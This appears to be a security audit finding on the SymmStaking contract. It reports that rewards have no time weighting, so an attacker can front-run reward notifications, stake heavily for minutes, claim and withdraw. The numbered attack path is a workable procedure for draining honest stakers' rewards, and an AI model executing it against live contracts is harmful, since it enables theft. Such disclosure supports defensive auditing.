# Front-Running Vulnerability in Reward Distribution Mechanism

### Summary

The lack of time-weighted staking mechanisms in `SymmStaking` will cause a disproportionate reward extraction for long-term stakers as attackers will front-run reward distribution events, stake large amounts, earn rewards for minimal time, then immediately withdraw.

### Root Cause

The choice to distribute rewards purely based on proportional stake without minimum staking periods is a mistake as it contradicts the stated goal of `reward long-term participation` mentioned in the [README](https://github.com/SYMM-IO/token/blob/main/contracts/staking/README.md#:~:text=reward%20long%2Dterm%20participation). In [SymmStaking.sol](https://github.com/SYMM-IO/token/blob/1d014156b1d9f0ab3259026127b9220eb2da3292/contracts/staking/SymmStaking.sol#L17), rewards accrue proportionally to stake amount with no time-weighted factor or minimum staking period, which doesn't align with the intended economic design.

[withdraw](https://github.com/SYMM-IO/token/blob/1d014156b1d9f0ab3259026127b9220eb2da3292/contracts/staking/SymmStaking.sol#L250)

### Internal Pre-conditions

1. The staking contract must have at least one whitelisted reward token
2. Admin or reward manager needs to call configureRewardToken() to whitelist at least one reward token
3. Reward tokens need to be distributed via notifyRewardAmount()
4. The contract must be unpaused to allow staking, withdrawal, and claiming operations

### External Pre-conditions

1. An attacker must have access to a large amount of the staking token (SYMM)
2. Gas fees must be low enough to make the attack economically viable
3. There must be other users participating honestly in the staking program (to extract rewards from)
4. The attacker must be able to monitor the mempool for pending reward notification transactions

### Attack Path

1. Attacker monitors mempool for pending `notifyRewardAmount()` transactions
2. Attacker front-runs by calling `deposit()` with a `large` amount of SYMM tokens
3. Original reward notification transaction executes, distributing rewards at a rate proportional to current staked amounts
4. Attacker waits a minimal period (as little as 200 seconds or 0.03% of the reward period)
5. Attacker calls `claimRewards()` to collect rewards proportional to their dominant stake
6. Attacker immediately calls `withdraw()` to retrieve their staked tokens
7. Attacker can `repeat this process` whenever new rewards are added

### Impact

The honest long-term stakers suffer an approximate loss of 99% of the rewards they should have received during attack periods. The attacker gains these rewards with minimal participation time, undermining the stated goal of the staking system to reward long-term participation. This results in a economically unsustainable staking system where long-term participation is not properly incentivized.

```

### Mitigation

Im not sure about mitigation. But i think there is a several solutions:

1. Implement minimum staking periods: Require users to stake for a minimum duration (e.g., 1 week) before they can withdraw.
2. Introduce time-weighted rewards: Modify the reward calculation to factor in both stake amount and staking duration, giving proportionally higher rewards to those who stake longer.
